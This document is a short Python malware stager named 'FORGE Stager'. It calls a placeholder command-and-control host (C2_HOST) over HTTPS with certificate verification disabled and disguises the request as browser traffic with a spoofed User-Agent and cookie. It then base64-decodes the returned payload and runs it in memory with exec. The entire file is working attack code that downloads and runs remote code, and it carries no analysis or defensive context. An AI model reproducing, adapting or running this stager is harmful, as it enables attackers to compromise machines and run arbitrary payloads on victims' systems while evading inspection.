#!/usr/bin/env python3
"""FORGE Stager — Minimal footprint, in-memory payload execution."""
import urllib.request, ssl, base64

U = "https://C2_HOST:443/api/v1/status"

def s():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    r = urllib.request.Request(U, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "session=c3RhZ2Vy"})
    with urllib.request.urlopen(r, context=c) as p:
        d = p.read()
    try:
        import json
        j = json.loads(d)
        d = base64.urlsafe_b64decode(j.get("data", ""))
    except Exception:
        pass
    exec(compile(d, "<stage>", "exec"), {"__name__": "__main__"})

if __name__ == "__main__":
    s()
